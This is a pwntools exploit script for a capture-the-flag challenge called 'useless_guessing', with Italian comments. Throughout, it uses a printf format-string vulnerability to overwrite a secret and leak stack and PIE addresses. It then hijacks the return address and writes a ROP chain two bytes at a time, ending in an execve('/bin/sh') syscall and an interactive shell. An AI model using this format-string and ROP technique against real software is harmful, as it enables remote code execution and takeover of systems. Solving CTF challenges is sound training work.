from pwn import *

logging.disable()
context.terminal = ['gnome-terminal', '--wait', '--', 'bash', '-c']

r = remote("uselessguessing.challs.olicyber.it", 38071)
# r = process("./useless_guessing")
elf = ELF("useless_guessing")
elf.address = 0

monnezza1 = len("[1776284405] Guess attempt: ")
monnezza2 = len("[1776284405] Successful guess: ")

def gen_payload(what, where, already_written, fix_secret=False):
    printf_offset = 26

    if fix_secret:
        prefix = b"%25$n"
        expected_len = 24
        printf_offset += 1
    else:
        prefix = b""
        expected_len = 16

    part1 = f"%{(what - already_written) & 0xffff}c".encode()
    part2 = f"%{printf_offset + 2}$hn".encode()
    padding = b"A" * (expected_len - len(prefix) - len(part1) - len(part2))
    part3 = p64(where)

    payload = prefix + part1 + part2 + padding + part3

    return payload

r.recv(1000)
r.sendline(b"%25$hn%36$p %37$p")   # sovrascrivo secret e prendo stack e pie
r.recv(1000)
r.sendline(b"\x1c\x00")

data = r.recvline().decode().split(": ")[1].strip().split(" ")

stack_leak = int(data[0], 16)
main_addr = int(data[1], 16) - 24
pie_base = main_addr - elf.symbols["main"]

call_chall_addr = (main_addr + 19) & 0xffff
stack_ret = stack_leak - 0x8

payload = gen_payload(call_chall_addr, stack_ret, monnezza2)

r.recv(1000)
r.sendline(payload) # faccio ritornare al main

def send_block(what, where):
    r.sendafter(b"Who are you?\n", gen_payload(what, where, monnezza1, fix_secret=True)[:-1])
    r.sendlineafter(b"What is the secret?\n", b"\x1c\x00")
    r.sendlineafter(b"Who are you?\n", gen_payload(call_chall_addr, stack_ret, monnezza2))

POP_RAX_POP_RDX_POP_RBX = pie_base + 0x000000000008de8a
POP_RDI = pie_base + 0x000000000000917f
POP_RSI = pie_base + 0x00000000000111ee
SYSCALL = pie_base + 0x000000000000887f
BIN_SH = stack_ret - 0x30 # verrà messo alla fine come input di secret

ropchain = p64(BIN_SH)
ropchain += p64(POP_RAX_POP_RDX_POP_RBX)
ropchain += p64(0x3b)
ropchain += p64(0x0)
ropchain += p64(0x0)
ropchain += p64(POP_RSI)
ropchain += p64(0x0)
ropchain += p64(SYSCALL)

for i in range(0, len(ropchain), 2):
    send_block(u16(ropchain[i:i+2]), stack_ret+0x8 + i)

r.sendlineafter(b"Who are you?\n", b"%25$hn")
r.recv(1000)
r.sendline(b"\x1c\x00AAAAAA/bin/sh\x00")
r.recv(1000)
r.sendline(gen_payload(POP_RDI & 0xffff, stack_ret, monnezza2))

r.interactive()